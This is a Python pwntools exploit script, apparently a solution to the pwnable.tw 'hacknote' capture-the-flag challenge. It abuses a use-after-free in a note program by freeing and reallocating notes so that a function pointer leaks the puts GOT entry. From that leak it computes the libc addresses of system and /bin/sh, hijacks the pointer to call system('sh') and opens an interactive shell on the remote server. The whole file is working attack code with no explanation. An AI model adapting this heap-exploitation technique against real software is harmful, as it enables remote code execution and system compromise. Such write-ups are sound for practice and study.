#! /usr/bin/env python

from pwn import *
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

# sh = process("./hacknote")
sh = remote("chall.pwnable.tw", 10102)

elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
# libc = ELF("./libc.so.6")

puts_got = elf.got["puts"]
log.info("Puts got -> " + hex(puts_got))
printFunc = p32(0x804862b)
log.info("PrintFunc addr -> " + printFunc)
puts_libc = libc.symbols["puts"]
log.info("Puts libc -> " + hex(puts_libc))
system_libc = libc.symbols["system"]
log.info("system libc -> " + hex(system_libc))

bin_sh = libc.search("/bin/sh").next()
log.info("/bin/sh -> " + hex(bin_sh))


def add(size, content):
    sh.recvuntil("Your choice :")
    sh.sendline("1")
    sh.recvuntil("Note size :")
    sh.sendline(str(size))
    sh.recvuntil("Content :")
    sh.sendline(str(content))
    sh.recvuntil("Success !")
    log.success("Add Success!")


def delete(index):
    sh.recvuntil("Your choice :")
    sh.sendline("2")
    sh.recvuntil("Index :")
    sh.sendline(str(index))
    sh.recvuntil("Success")
    log.success("Delete Success!")


def Print(index):
    sh.recvuntil("Your choice :")
    sh.sendline("3")
    sh.recvuntil("Index :")
    sh.sendline(str(index))


def main():

    add(32, "aaa")
    add(32, "bbb")
    delete(0)
    delete(1)

    note0Content = printFunc + p32(puts_got)
    add(8, note0Content)

    Print(0)
    puts_addr = u32(sh.recv()[:4])
    log.info("Puts addr -> " + hex(puts_addr))
    
    offset = puts_addr - puts_libc
    system_addr = offset + system_libc
    log.info("system addr -> " + hex(system_addr))
    
    bin_sh_addr = offset + bin_sh
    log.info("/bin/sh address -> " + hex(bin_sh_addr))
    
    sh.sendline("\n")    
    delete(2)
    note0Content = p32(system_addr) + "&sh" #p32(bin_sh_addr)
    # gdb.attach(sh)
    # note0Content = p32(0x5fbc5 + offset)
    add(8, note0Content)
    Print(0)
    

    sh.interactive()
main()
